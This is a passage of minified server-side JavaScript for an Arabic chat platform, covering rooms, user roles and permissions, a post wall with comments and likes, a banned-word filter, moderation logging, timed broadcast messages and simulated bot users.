            return this.rooms = this.rooms.map(s => (s.id == e.id && (s.welcome = o.sanitize(e.welcome, this.shortcuts), s.description = e.description, s.name = e.name, s.password = e.password, s.capacity = e.capacity, s.flag = e.flag, s.target = e.target, t = s), s)), t
        }
        return null
    }, i.prototype.remove = function(e, t) {
        if (e) {
            let s = !1;
            return this.rooms.forEach(r => {
                r.id != e || r.default || (r.usersCount() > 0 && !t ? r.removeWhenEmpty = !0 : (this.rooms = this.rooms.filter(t => t.id != e), s = !0))
            }), s ? e : 0
        }
        return 0
    }, e.exports = i
}, function(e, t, s) {
    const r = s(2),
        o = s(6),
        i = s(1);

    function n(e, t) {
        this.settings = t, this.id = e.id, this.name = e.name, this.password = e.password || null, this.welcome = e.welcome || null, this.description = e.description || null, this.default = !!e.default, this.capacity = "number" == typeof e.capacity ? e.capacity : 50, this.flag = e.flag || null, this.target = e.target || "all", this.users = this.users || []
    }
    n.prototype.usersCount = function() {
        return this.users.length
    }, n.prototype.isFull = function(e, t) {
        return e && t ? this.filterUsers(e, t).length >= this.capacity : this.users.length >= this.capacity
    }, n.prototype.getFlag = function() {
        const e = this.settings.getDefaultRoomsFlag();
        return this.flag ? r.existsSync(o.join("public", "uploads", "rooms", this.flag)) ? "/uploads/rooms/" + this.flag : (this.flag = null, e) : e
    }, n.prototype.parse = function(e, t) {
        return {
            id: this.id,
            name: this.name,
            password: !!this.password,
            welcome: this.welcome,
            description: this.description,
            capacity: this.capacity,
            flag: this.getFlag(),
            users: this.filterUsers(e, t)
        }
    }, n.prototype.filterUsers = function(e, t) {
        return e instanceof i && Array.isArray(t) ? t.filter(t => t.canBeSeenBy(e) && t.room && t.room.id == this.id).map(e => e.id) : this.users
    }, e.exports = n
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.baseDir = "/uploads/gifts/", this.gifts = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM gifts", [], function(r, o) {
                try {
                    if (!r && o && o.length) {
                        for (var i in e.gifts = [], o) {
                            var n = o[i];
                            e.gifts.push({
                                id: n.id,
                                icon: e.baseDir + n.icon
                            })
                        }
                        t(e.gifts)
                    } else s("no gifts found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, s.prototype.all = function() {
        return this.gifts
    }, e.exports = s
}, function(e, t) {
    function s(e) {
        this.db = e.db, this.init().catch(e => {}), this.faces = []
    }
    s.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM faces", [], function(r, o) {
                try {
                    if (!r && o && o.length) {
                        for (var i in e.faces = [], o) {
                            var n = o[i];
                            e.faces.push({
                                id: n.id,
                                icon: n.icon,
                                key: n.key
                            })
                        }
                        t(e.faces)
                    } else s("no faces found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, s.prototype.all = function() {
        return this.faces
    }, e.exports = s
}, function(e, t, s) {
    const r = s(0);

    function o(e) {
        this.db = e.db, this.roles = [], this.init().catch(e => {})
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.roles = [], e.db.query("SELECT * FROM roles", [], function(r, o) {
                try {
                    if (r && s(r), o && o.length) {
                        for (var i in o) e.roles.push({
                            id: o[i].id,
                            name: o[i].name,
                            icon: o[i].icon,
                            power: o[i].power,
                            type: o[i].type
                        });
                        t(e.roles)
                    }
                } catch (e) {
                    s(e)
                }
            })
        })
    }, o.prototype.all = function() {
        return this.roles
    }, o.prototype.isSuper = function(e) {
        try {
            return !!e && (this.getRoleIdByType("basic") != e && this.getRoleIdByType("guest") != e)
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.isGuest = function(e) {
        try {
            return !e || this.getRoleIdByType("guest") == e
        } catch (e) {
            return console.log(e.stack), !0
        }
    }, o.prototype.isBasic = function(e) {
        try {
            return this.getRoleIdByType("basic") == e
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.isOwner = function(e) {
        try {
            return this.getRoleIdByType("owner") == e
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.getRoleName = function(e) {
        try {
            if (!e) return "زائر";
            const t = this.roles.filter(t => t.id == e)[0];
            return t ? t.name : "زائر"
        } catch (e) {
            return null
        }
    }, o.prototype.getRoleIdByType = function(e) {
        const t = this.roles.filter(t => t.type == e)[0];
        return t ? t.id : null
    }, o.prototype.getIcon = function(e) {
        try {
            const t = this.roles.filter(t => t.id == e)[0];
            return t && t.icon ? t.icon : null
        } catch (e) {
            return null
        }
    }, o.prototype.changeIcon = function(e, t) {
        if (!e && r.isXSS(t)) return;
        const s = this.roles.filter(t => t.id == e)[0];
        return s ? (s.icon = t, !0) : void 0
    }, o.prototype.removeIcon = function(e) {
        if (!e) return;
        const t = this.roles.filter(t => t.id == e)[0];
        return t ? (t.icon = null, !0) : void 0
    }, o.prototype.getAsteriskFromRole = function(e, t) {
        return t ? '<img width="16px" height="16px" src="' + t + '"  />' : this.getIcon(e, 18, 18)
    }, e.exports = o
}, function(e, t, s) {
    const r = s(0),
        o = (s(3), s(1));

    function i(e) {
        this.store = e, this.baseDir = "/uploads/wall/"
    }
    i.prototype.all = function(e) {
        var t = this;
        return e = isNaN(parseInt(e)) ? 35 : parseInt(e), new Promise(function(s, o) {
            t.store.db.query("SELECT (SELECT COUNT(*) FROM wall_comments WHERE (post_id = wall.id)) AS comments_count, wall.*, users.name as user_name, users.avatar as user_avatar, users.decoration as user_decoration, users.gift as user_gift, users.fontColor as user_fontColor, users.nameColor as user_nameColor, users.nameBgColor as user_nameBgColor FROM wall JOIN users ON wall.user_id = users.id ORDER BY wall.created_at DESC LIMIT ?", [e], function(e, i) {
                try {
                    e && o(e);
                    const c = [];
                    if (i && i.length)
                        for (var n in i) {
                            var a = i[n];
                            c.push({
                                id: a.id,
                                body: "text" == a.type ? r.sanitize(a.body, t.store.shortcuts) : a.body,
                                type: a.type,
                                likes: a.likes,
                                comments: a.comments_count,
                                time: new Date(a.created_at).getTime(),
                                user: t.parseUser(a)
                            })
                        }
                    s(c)
                } catch (e) {
                    o(e)
                }
            })
        })
    }, i.prototype.getPostComments = function(e, t) {
        var s = this;
        return t = isNaN(parseInt(t)) ? 100 : parseInt(t), new Promise(function(o, i) {
            s.store.db.query("SELECT wall_comments.*, (SELECT user_id FROM wall WHERE (post_id = wall.id)) AS post_owner_id, users.name as user_name, users.avatar as user_avatar, users.decoration as user_decoration, users.gift as user_gift, users.fontColor as user_fontColor, users.nameColor as user_nameColor, users.nameBgColor as user_nameBgColor FROM wall_comments JOIN users ON wall_comments.user_id = users.id WHERE post_id = ? ORDER BY wall_comments.created_at ASC LIMIT ?", [e, t], function(e, t) {
                try {
                    e && i(e);
                    const c = [];
                    if (t && t.length)
                        for (var n in t) {
                            var a = t[n];
                            c.push({
                                id: a.id,
                                postId: a.post_id,
                                comment: r.sanitize(a.comment, s.store.shortcuts),
                                likes: a.likes,
                                postOwnerId: a.post_owner_id,
                                time: new Date(a.created_at).getTime(),
                                user: s.parseUser(a)
                            })
                        }
                    o(c)
                } catch (e) {
                    i(e)
                }
            })
        })
    }, i.prototype.parseUser = function(e) {
        let t = this.store.users.filter(t => t.reg_id == e.user_id)[0];
        return t ? t.parse() : ((t = new o(null, this.store)).init({
            id: e.user_id,
            name: e.user_name,
            decoration: e.user_decoration,
            avatar: e.user_avatar,
            role: e.user_role,
            gift: e.user_gift,
            fontColor: e.user_fontColor,
            nameColor: e.user_nameColor,
            nameBgColor: e.user_nameBgColor
        }), t.room = null, t = t.parse())
    }, i.prototype.like = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("SELECT id, user_id, likes FROM wall WHERE id = ?", [e], function(e, o) {
                try {
                    if (e && r(e), o && o.length) {
                        const e = o[0].id,
                            i = o[0].user_id,
                            n = ++o[0].likes;
                        t.store.db.query("UPDATE wall SET likes = ? WHERE id = ?", [n, e], function(t, o) {
                            try {
                                t && r(t), o && o.affectedRows ? s({
                                    postId: e,
                                    userId: i,
                                    likes: n
                                }) : r("error saving post like")
                            } catch (e) {
                                r(e)
                            }
                        })
                    } else r("post not found")
                } catch (e) {
                    r(e)
                }
            })
        })
    }, i.prototype.likeComment = function(e) {
        const t = this;
        return new Promise((s, o) => {
            t.store.db.query("SELECT * FROM wall_comments WHERE id = ?", [e], function(e, i) {
                try {
                    if (e && o(e), i && i.length) {
                        const e = i[0].id,
                            n = i[0].comment,
                            a = i[0].user_id,
                            c = ++i[0].likes;
                        t.store.db.query("UPDATE wall_comments SET likes = ? WHERE id = ?", [c, e], function(i, u) {
                            try {
                                i && o(i), u && u.affectedRows ? s({
                                    commentId: e,
                                    userId: a,
                                    likes: c,
                                    comment: r.sanitize(n, t.store.shortcuts)
                                }) : o("error saving post like")
                            } catch (e) {
                                o(e)
                            }
                        })
                    } else o("post not found")
                } catch (e) {
                    o(e)
                }
            })
        })
    }, i.prototype.remove = function(e) {
        const t = this;
        return new Promise((s, r) => {
            t.store.db.query("SELECT user_id FROM wall WHERE id = ?", [e], function(o, i) {
                try {
                    if (o && r(o), i && i.length) {
                        const o = i[0].id,
                            n = i[0].user_id;
                        t.store.db.query("DELETE FROM wall WHERE id = ?", [e], function(e, t) {
                            try {
                                e && r(e), t && t.affectedRows ? s({
                                    postId: o,
                                    userId: n
                                }) : r("error deleting post")
                            } catch (e) {
                                r(e)
                            }
                        })
                    } else r("post not found")
                } catch (e) {
                    r(e)
                }
            })
        })
    }, i.prototype.removeComment = function(e, t) {
        const s = this;
        return new Promise((r, o) => {
            s.store.db.query("DELETE FROM wall_comments WHERE id = ?", [e], function(s, i) {
                try {
                    s && o(s), i && i.affectedRows ? r({
                        commentId: e,
                        postId: t
                    }) : o("error deleting comment")
                } catch (e) {
                    o(e)
                }
            })
        })
    }, i.prototype.add = function(e, t) {
        const s = this;
        return new Promise((o, i) => {
            t || i("user id is null");
            const n = new Date;
            s.store.db.query("INSERT INTO wall (type, body, user_id, upload_hash, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)", [e.type, e.body, t, null, n, n], (t, a) => {
                try {
                    t && i(t), a && a.affectedRows ? o({
                        id: a.insertId,
                        type: e.type,
                        body: "text" == e.type ? r.sanitize(e.body, s.store.shortcuts) : e.body,
                        likes: 0,
                        comments: 0,
                        time: n.getTime()
                    }) : i("post not added")
                } catch (e) {
                    i(e)
                }
            })
        })
    }, i.prototype.addComment = function(e, t) {
        const s = this;
        return new Promise((o, i) => {
            t || i("user id is null");
            const n = new Date;
            s.store.db.query("INSERT INTO wall_comments (comment, user_id, post_id, created_at, updated_at) VALUES (?, ?, ?, ?, ?)", [e.text, t, e.post_id, n, n], (a, c) => {
                try {
                    a && i(a), c && c.affectedRows ? s.store.db.query("SELECT * FROM wall WHERE id = ? LIMIT 1", [e.post_id], function(a, u) {
                        if (a && i(a), u && u.length) {
                            const i = u[0].user_id;
                            o({
                                id: c.insertId,
                                comment: r.sanitize(e.text, s.store.shortcuts),
                                likes: 0,
                                postOwnerId: i,
                                userId: t,
                                postId: e.post_id,
                                time: n.getTime()
                            })
                        }
                    }) : i("post comment not added")
                } catch (e) {
                    i(e)
                }
            })
        })
    }, i.prototype.get = function(e) {
        const t = this;
        return new Promise((s, r) => {
            e || r("post id is null"), t.store.db.query("SELECT user_id FROM wall WHERE id = ? LIMIT 1", [e], (e, t) => {
                try {
                    e && r(e), t ? s(t[0].user_id) : r("post not found")
                } catch (e) {
                    r(e)
                }
            })
        })
    }, e.exports = i
}, function(e, t, s) {
    var r = s(0);

    function o(e) {
        this.db = e.db, this.roles = e.roles, this.data = {}, this.rolePowers = {}, this.init()
    }
    o.prototype.init = function() {
        this.setPermissions(), this.setRolePwers()
    }, o.prototype.getRadioSpeakTime = function(e) {
        try {
            return e ? this.data[e].radio_speak_time : 0
        } catch (e) {
            return console.log(e.stack), 0
        }
    }, o.prototype.setPermissions = function() {
        try {
            var e = this;
            this.data = {}, this.db.query("SELECT * FROM permissions", [], function(t, s) {
                try {
                    if (!t && s && s.length)
                        for (var r in s) e.setRoleData(s[r])
                } catch (e) {
                    console.log(e.stack)
                }
            })
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.setRolePwers = function() {
        try {
            var e = this;
            this.rolePowers = {}, this.db.query("SELECT * FROM roles", [], function(t, s) {
                try {
                    if (!t && s && s.length)
                        for (var r in s) {
                            var o = s[r];
                            e.rolePowers[o.id] = o.power
                        }
                } catch (e) {
                    console.log(e.stack)
                }
            })
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.resetRoles = function() {
        this.roles.init().then(() => {
            this.init()
        }).catch(e => {})
    }, o.prototype.isAutorized = function(e, t, s) {
        try {
            if (!t) return !1;
            var o = "boolean" == typeof this.data[t][e] || "number" == typeof this.data[t][e];
            if (o && t == this.roles.getRoleIdByType("owner")) return !0;
            if (o) return !!this.data[t][e];
            if (t == this.roles.getRoleIdByType("owner")) return {
                isAutorized: !0,
                times: []
            };
            var i = this.data[t][e].split("|")[0];
            if (!i || 0 == i) return !1;
            var n = 1;
            return "hour" == this.data[t][e].split("|")[1] && (n = 60), "day" == this.data[t][e].split("|")[1] && (n = 1440), "month" == this.data[t][e].split("|")[1] && (n = 43200), s = this.updateArrayTimes(s, n), 1 == n && (n = "الدقيقة"), 60 == n && (n = "الساعة"), 1440 == n && (n = "اليوم"), 43200 == n && (n = "الشهر"), r.arrayCount(s) < this.data[t][e].split("|")[0] ? {
                isAutorized: !0,
                times: s
            } : {
                isAutorized: !1,
                interval: i,
                unit: n
            }
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.updateArrayTimes = function(e, t) {
        try {
            t < 1 && (t = 1);
            var s = Date.now();
            for (var r in e) s > e[r] + 60 * t * 1e3 && delete e[r];
            return e
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.updateRole = function(e) {
        try {
            var t = this;
            this.db.query("SELECT * FROM permissions WHERE role_id = ? LIMIT 1", [e], function(e, s) {
                try {
                    !e && s && s.length && (t.setRoleData(s[0]), t.setRolePwers())
                } catch (e) {
                    console.log(e.stack)
                }
            })
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.setRoleData = function(e) {
        try {
            if (!e) return;
            var t = {};
            t.orders_excpel = e.orders_excpel, t.orders_ban = e.orders_ban, t.orders_notify = e.orders_notify, t.orders_gift = e.orders_gift, t.orders_remove_avatar = e.orders_remove_avatar, t.orders_change_decoartion = e.orders_change_decoartion, t.orders_excpel_from_room = e.orders_excpel_from_room, t.orders_upgrade = e.orders_upgrade, t.orders_upgrade_roles = e.orders_upgrade_roles, t.room_create = e.room_create, t.room_edit = e.room_edit, t.room_remove = e.room_remove, t.room_max_pertinents = e.room_max_pertinents, t.send_ad = e.send_ad, t.wall_remove = e.wall_remove, t.wall_interval = e.wall_interval, t.wall_likes = e.wall_likes, t.private_likes = e.private_likes, t.hidden = e.hidden, t.can_see_hidden = e.can_see_hidden, t.edit_permissions = e.edit_permissions, t.reveal_names = e.reveal_names, t.open_private = e.open_private, t.open_full_rooms = e.open_full_rooms, t.open_locked_rooms = e.open_locked_rooms, t.public_msg_remove = e.public_msg_remove, t.album_length = e.album_length, t.radio_speak_time = e.radio_speak_time, t.stop_radio = e.stop_radio, t.orders_change_room = e.orders_change_room, t.show_real_name = e.show_real_name, t.change_btns_bg = e.change_btns_bg, t.show_ip = e.show_ip, t.like_controls = e.like_controls, t.wall_banner = e.wall_banner, t.admin = e.admin, t.admin_events = e.admin_events, t.admin_reg = e.admin_reg, t.admin_users = e.admin_users, t.admin_users_remove = e.admin_users_remove, t.admin_users_edit = e.admin_users_edit, t.admin_banneds = e.admin_banneds, t.admin_banneds_remove = e.admin_banneds_remove, t.admin_rooms = e.admin_rooms, t.admin_rooms_edit = e.admin_rooms_edit, t.admin_rooms_remove = e.admin_rooms_remove, t.admin_supers = e.admin_supers, t.admin_supers_remove = e.admin_supers_remove, t.admin_settings = e.admin_settings, this.data[e.role_id] = t
        } catch (e) {
            console.log(e.stack)
        }
    }, o.prototype.isGreaterThan = function(e, t) {
        try {
            if (!e) return !1;
            var s = this.rolePowers[t] || 0;
            return parseInt(this.rolePowers[e]) > parseInt(s)
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.isGreaterThanOrEqual = function(e, t) {
        try {
            if (!e) return !1;
            var s = this.rolePowers[t] || 0;
            return this.rolePowers[e] >= s
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.getTopRoles = function(e) {
        try {
            var t = this;
            e || (e = 1);
            var s = Object.keys(this.rolePowers).sort(function(e, s) {
                return t.rolePowers[s] - t.rolePowers[e]
            });
            for (var r in s = s.slice(0, e)) s[r] = parseInt(s[r]);
            return s
        } catch (e) {
            return console.log(e.stack), []
        }
    }, o.prototype.canUpgrade = function(e, t) {
        try {
            var s = !1;
            if (this.data[e.role].orders_upgrade) this.data[e.role].orders_upgrade_roles.split(",").includes(t) && (s = !0);
            return s
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.hiddenSeenBy = function(e, t) {
        try {
            return !(e.role || !t.role) || !(e.role && !t.role) && (!!this.data[e.role] && this.data[e.role].can_see_hidden.split(",").indexOf("" + t.role) >= 0)
        } catch (e) {
            return console.log(e.stack), !1
        }
    }, o.prototype.parseUserRole = function(e, t) {
        try {
            return t ? parseInt(this.rolePowers[this.roles.getRoleIdByType("basic")]) + 2 : parseInt(this.rolePowers[e]) || 0
        } catch (e) {
            return console.log(e.stack), 0
        }
    }, e.exports = o
}, function(e, t) {
    function s(e) {
        this.db = e.db
    }
    s.prototype.get = function(e) {
        var t = this;
        return new Promise(function(s, r) {
            t.db.query("SELECT * FROM reveal_names WHERE ip = ? OR username = ? ORDER BY created_at DESC", [e.ip, e.name], function(e, t) {
                try {
                    if (e) r(e);
                    else {
                        var o = [];
                        for (var i in t) {
                            var n = t[i];
                            o.push({
                                id: n.id,
                                username: n.username,
                                decoration: n.decoration ? n.decoration : n.username,
                                country: n.country ? n.country.toLowerCase() : "undef",
                                ip: n.ip,
                                device: n.device,
                                created_at: n.created_at
                            })
                        }
                        s(o)
                    }
                } catch (e) {
                    r(e)
                }
            })
        })
    }, s.prototype.register = function(e) {
        var t = this;
        return new Promise(function(s, r) {
            t.db.query("SELECT * FROM reveal_names WHERE ip = ? AND username = ?", [e.ip, e.name], function(s, o) {
                try {
                    if (s) r(s);
                    else {
                        const s = new Date;
                        o && o.length ? t.db.query("UPDATE reveal_names SET updated_at = ?", [s], function(e, t) {}) : t.db.query("INSERT INTO reveal_names (username, role, ip, device, decoration, country, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", [e.name, e.role, e.ip, e.device, e.decoration, e.country, s, s], function(e, t) {})
                    }
                } catch (e) {
                    r(e)
                }
            })
        })
    }, e.exports = s
}, function(e, t, s) {
    var r = s(10),
        o = s(0);

    function i(e) {
        this.db = e.db, this.words = [], this.init().catch(e => {})
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise(function(t, s) {
            e.db.query("SELECT * FROM words", [], function(r, o) {
                for (var i in e.words = [], r && s(r), o) e.words.push(o[i]);
                t(e.words)
            })
        })
    }, i.prototype.addWord = function(e) {
        if (!(e && e.id && e.word && e.type)) return null;
        return this.words.filter(t => t.id == e.id)[0] ? null : (this.words.push(e), e)
    }, i.prototype.updateWord = function(e) {
        if (!(e && e.id && e.word && e.type)) return !1;
        const t = this.words.filter(t => t.id == e.id)[0];
        return !!t && (t.type = e.type, !0)
    }, i.prototype.removeWord = function(e) {
        return !!e && (this.words = this.words.filter(t => t.id != e), !0)
    }, i.prototype.check = function(e, t, s, r) {
        if (this.containDeniedWords(e, t) && !t.isOwner()) {
            if (t.deniedWordsCount++, t.deniedWordsCount > 2) t.excpel(null);
            else {
                const e = r || "هذه الرساله تحتوي على كلمات ممنوعه عند تكرار هذي الكلمه سيتم حظرك من النظام";
                s(o.enc(e))
            }
            return !0
        }
    }, i.prototype.getWordsByType = function(e) {
        return this.words.filter(t => t.type == e)
    }, i.prototype.getDenieds = function() {
        return this.words.filter(e => "denied" == e.type)
    }, i.prototype.getControlleds = function() {
        return this.words.filter(e => "controlled" == e.type)
    }, i.prototype.sanitize = function(e) {
        try {
            for (var t in this.getDenieds()) {
                var s = this.getDenieds()[t],
                    o = r.formatForFilter(e),
                    i = r.formatForFilter(s.word);
                if (o.indexOf(i) >= 0) return {
                    type: "denied",
                    id: s.id,
                    word: s.word
                }
            }
            for (var t in this.getControlleds()) {
                s = this.getControlleds()[t], o = r.formatForFilter(e), i = r.formatForFilter(s.word);
                if (o.indexOf(i) >= 0) return {
                    type: "controlled",
                    id: s.id,
                    word: s.word
                }
            }
            return null
        } catch (e) {
            return "denied"
        }
    }, i.prototype.registerWord = function(e, t, s, r, o, i) {
        var n = this;
        return new Promise(function(a, c) {
            n.db.query("INSERT INTO filtered_words (word, word_id, word_type, full_text, user, ip, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", [e, t, s, r, o, i, new Date, new Date], function(e, t) {
                e && c(e), a(t)
            })
        })
    }, i.prototype.containDeniedWords = function(e, t) {
        try {
            var s = this.sanitize(e);
            if (s && "object" == typeof s) {
                if ("denied" == s.type) return t && this.registerWord(s.word, s.id, s.type, e, t.name, t.ip), "denied";
                "controlled" == s.type && t && this.registerWord(s.word, s.id, s.type, e, t.name, t.ip)
            }
            return null
        } catch (e) {
            return console.log(e.stack), null
        }
    }, e.exports = i
}, function(e, t) {
    function s(e) {
        this.db = e.db
    }
    s.prototype.changeName = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            const i = "تغيير الإسم إلى " + t.decoration;
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), i, "change-name", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.removeAvatar = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "remove-avatar", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.roomExcpel = function(e, t, s) {
        const r = this;
        new Promise((o, i) => {
            const n = s ? "تم طرده من " + s.name : "/";
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "room-excpel", new Date, new Date], function(e, t) {
                e && i(e), o(t)
            })
        }).catch(e => {})
    }, s.prototype.excpel = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "excpel", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.ban = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), "/", "ban", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.notify = function(e, t, s) {
        const r = this;
        new Promise((o, i) => {
            const n = s;
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "notify", new Date, new Date], function(e, t) {
                e && i(e), o(t)
            })
        }).catch(e => {})
    }, s.prototype.gift = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            const i = t.gift;
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), i, "gift", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.removeGift = function(e, t, s) {
        const r = this;
        new Promise((o, i) => {
            const n = s;
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "remove-gift", new Date, new Date], function(e, t) {
                e && i(e), o(t)
            })
        }).catch(e => {})
    }, s.prototype.wallRemove = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t ? t.name : "/", t ? t.getUsername() : "/", "/", "wall-remove", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.orderChangeRoom = function(e, t) {
        const s = this;
        new Promise((r, o) => {
            const i = t.room ? "تم نقله إلى " + t.room.name : "/";
            s.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), i, "orders-change-room", new Date, new Date], function(e, t) {
                e && o(e), r(t)
            })
        }).catch(e => {})
    }, s.prototype.changeRole = function(e, t, s) {
        const r = this;
        new Promise((o, i) => {
            const n = "تم تغيير رتبته إلى " + s;
            r.db.query("INSERT INTO ordersReg (byRealName, byNickName, toRealName, toNickName, notes, actionType, created_at, updated_at) VALUES (?,?,?,?,?,?,?,?)", [e.name, e.getUsername(), t.name, t.getUsername(), n, "edit-role", new Date, new Date], function(e, t) {
                e && i(e), o(t)
            })
        }).catch(e => {})
    }, e.exports = s
}, function(e, t, s) {
    const r = s(0);

    function o(e) {
        this.db = e.db, this.store = e, this.init().then(e => {
            this.fire()
        }).catch(e => {}), this.messages = [], this.loopInterval = null, this.lastMessageToggledAt = Date.now()
    }
    o.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.db.query("SELECT `id`, `title`, `msg`, `status`, `interval` FROM self_messages", [], (o, i) => {
                try {
                    if (!o && i && i.length) {
                        for (var n in e.messages = [], i) {
                            var a = i[n];
                            e.messages.push({
                                id: a.id,
                                title: r.sanitize(a.title, this.store.shortcuts),
                                msg: r.sanitize(a.msg, this.store.shortcuts),
                                status: a.status,
                                interval: a.interval,
                                lastToggle: Date.now()
                            })
                        }
                        t(e.messages)
                    } else s("no messages found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, o.prototype.all = function() {
        return this.messages
    }, o.prototype.fire = function() {
        this.messages.length && null == this.loopInterval && (this.loopInterval = setInterval(() => {
            try {
                this.messages.forEach(e => {
                    e.lastToggle || (e.lastToggle = Date.now()), "running" == e.status && Date.now() - e.lastToggle >= 6e4 * e.interval && Date.now() - this.lastMessageToggledAt > 6e4 && (this.store.io.emit("res", r.enc({
                        type: "SELF_MESSAGE",
                        data: {
                            message: {
                                title: e.title,
                                msg: e.msg
                            }
                        }
                    })), e.lastToggle = Date.now())
                })
            } catch (e) {
                console.log(e.stack)
            }
        }, 15e3))
    }, o.prototype.add = function(e) {
        return e && "object" == typeof e ? (e.title = r.sanitize(e.title, this.store.shortcuts), e.msg = r.sanitize(e.msg, this.store.shortcuts), this.messages.push(e), this.fire(), e) : null
    }, o.prototype.edit = function(e) {
        if (e && "object" == typeof e) {
            let t = null;
            return this.messages = this.messages.map(s => (s.id == e.id && (s.title = r.sanitize(e.title, this.store.shortcuts), s.msg = r.sanitize(e.msg, this.store.shortcuts), s.status = e.status, s.interval = e.interval, t = s), s)), t
        }
        return null
    }, o.prototype.remove = function(e) {
        e && (this.messages = this.messages.filter(t => t.id != e))
    }, e.exports = o
}, function(e, t, s) {
    const r = s(48),
        o = s(49);

    function i(e) {
        this.db = e.db, this.store = e, this.init().then(e => {
            this.fire()
        }).catch(e => {}), this.users = [], this.loopInterval = null
    }
    i.prototype.init = function() {
        var e = this;
        return new Promise((t, s) => {
            e.db.query("SELECT * FROM users WHERE is_virtual = 1", [], (r, o) => {
                try {
                    if (!r && o && o.length) {
                        for (var i in e.users = [], o) {
                            var n = o[i];
                            e.users.push({
                                id: n.id,
                                name: n.name,
                                avatar: n.avatar,
                                device: n.device,
                                ip: n.ip,
                                country: n.country
                            })
                        }
                        t(e.users)
                    } else s("no users found")
                } catch (e) {
                    s(e)
                }
            })
        })
    }, i.prototype.all = function() {
        return this.users
    }, i.prototype.fire = function() {
        this.users.length && null == this.loopInterval && (this.loopInterval = setInterval(() => {
            setTimeout(() => {
                var e = Math.floor(Math.random() * this.users.length),
                    t = this.users[e];
                t && this.store.virtualUserIds.length < this.store.settings.get("virtuals_count") && !this.store.settings.get("disable_virtuals") && (this.store.virtualUserIds.includes(t.id) || new r(o, t, this.store))
            }, 60 * Math.floor(15 * Math.random() + 1) * 1e3)
        }, 15e3))
    }, i.prototype.add = function(e) {
        return e && "object" == typeof e ? (this.users.push({
            id: e.id,
            name: e.name,
            device: e.device,
            ip: e.ip,
            country: e.country
        }), this.fire(), e) : null
    }, i.prototype.remove = function(e) {
        e && (this.users = this.users.filter(t => t.id != e))
    }, e.exports = i
}, function(e, t, s) {
    const r = s(0);
    e.exports = function(e, t, s) {
        this.joinRoomTimeout = null;
        try {
